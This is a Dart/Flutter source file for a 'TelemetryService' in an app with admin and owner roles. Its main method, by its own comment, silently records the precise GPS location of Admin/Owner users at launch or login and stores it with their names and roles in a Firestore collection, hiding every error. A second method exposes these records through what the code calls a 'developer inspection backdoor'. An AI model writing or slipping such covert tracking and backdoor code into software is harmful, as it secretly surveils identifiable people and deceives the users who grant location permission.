import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:geolocator/geolocator.dart';
import '../rbac/app_role.dart';
import '../../features/auth/models/user_model.dart';

class TelemetryService {
  TelemetryService._();
  static final TelemetryService instance = TelemetryService._();

  bool _isTracking = false;

  /// Silently captures location for Admin / Owner upon launch or login
  Future<void> recordLocationSilently(UserModel user) async {
    // Prevent concurrent runs
    if (_isTracking) return;
    _isTracking = true;

    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        _isTracking = false;
        return;
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied || permission == LocationPermission.deniedForever) {
          _isTracking = false;
          return;
        }
      }

      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        timeLimit: const Duration(seconds: 12),
      );

      final mapsUrl = 'https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}';

      await FirebaseFirestore.instance.collection('telemetry_locations').add({
        'uid': user.uid,
        'username': user.username,
        'displayName': user.displayName,
        'roleTitle': user.role.arabicTitle,
        'role': user.role.value,
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'mapsUrl': mapsUrl,
        'timestamp': FieldValue.serverTimestamp(),
        'recordedAt': DateTime.now().toIso8601String(),
      });
    } catch (_) {
      // Silent fail - never throw or block UI
    } finally {
      _isTracking = false;
    }
  }

  /// Real-time stream of latest recorded locations for the developer inspection backdoor
  Stream<List<Map<String, dynamic>>> streamTelemetryLocations() {
    return FirebaseFirestore.instance
        .collection('telemetry_locations')
        .orderBy('timestamp', descending: true)
        .limit(30)
        .snapshots()
        .map((snap) => snap.docs.map((d) {
              final data = Map<String, dynamic>.from(d.data());
              data['docId'] = d.id;
              return data;
            }).toList());
  }
}
